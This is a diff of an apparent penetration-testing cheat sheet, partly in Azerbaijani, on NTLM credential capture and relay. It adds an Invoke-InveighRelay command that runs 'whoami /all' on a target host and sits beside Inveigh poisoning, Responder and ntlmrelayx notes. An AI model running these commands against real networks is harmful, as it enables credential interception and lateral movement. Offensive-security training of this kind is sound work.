@@ -45,6 +45,9 @@ Import-Module .\Inveigh.ps1
 Invoke-Inveigh -ConsoleOutput Y -NBNS Y -LLMNR Y -mDNS Y
 Invoke-Inveigh -ConsoleOutput Y -NBNS Y -LLMNR Y -mDNS Y -FileUpload L -IP <SPECIAL-IP> -Unique
 
+Invoke-InveighRelay -Target 172.16.0.50 -Command "whoami /all" -ConsoleOutput Y
+
+
 ## NTLMRELAYX
 Terminal 1: 192.168.1.40 dan gələn NTLM Hash ilə 192.168.1.50 hostuna NTLM Relay edir ( Self-Relay mümkün deyil )
 /etc/responder/Responder.conf --> SMB = Off / HTTP = Off
@@ -120,4 +123,5 @@ Interactive Shell: Maşına daxil olub komandalar icra edirsən.
 
 SOCKS Proxy: Hədəf maşını bir tramplin kimi istifadə edərək şəbəkənin daha dərinliklərinə sızırsan.
 ```
+
 
